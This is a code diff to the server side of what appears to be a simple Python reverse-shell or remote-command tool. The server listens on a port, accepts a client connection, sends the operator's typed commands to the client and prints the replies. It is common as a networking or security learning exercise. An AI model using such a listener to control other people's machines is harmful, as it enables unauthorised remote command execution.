@@ -12,7 +12,7 @@ def build_socket():
         global s
 
         host = ""
-        port = 2345
+        port = 9999
 
         s= socket.socket()
 
@@ -39,9 +39,6 @@ def connect_sockets(): #we have to connect port and host socket
         connect_sockets()
 
 def accept_con(): #after binding socket to host and post and socket is listening then we can initiate this function
-    
-    global conn
-
     conn,address=s.accept()
     print("The connection is established between IP:"+address[0]," |Port:"+str(address[1]))
 
@@ -49,8 +46,7 @@ def accept_con(): #after binding socket to host and post and socket is listening
     conn.close()
 
 
-def send_commands():   #this fuction sends commands to the client 
-
+def send_commands(conn):   #this fuction sends commands to the client 
     while True:
         cmd=input()
 
@@ -61,7 +57,8 @@ def send_commands():   #this fuction sends commands to the client
         
         if len(str.encode(cmd))>0:
             conn.send(str.encode(cmd))
-            client_res= str(conn.recv(1024),"utf-8")
+            client_response = str(conn.recv(1024),"utf-8")
+            print(client_response, end="")
 
 
 
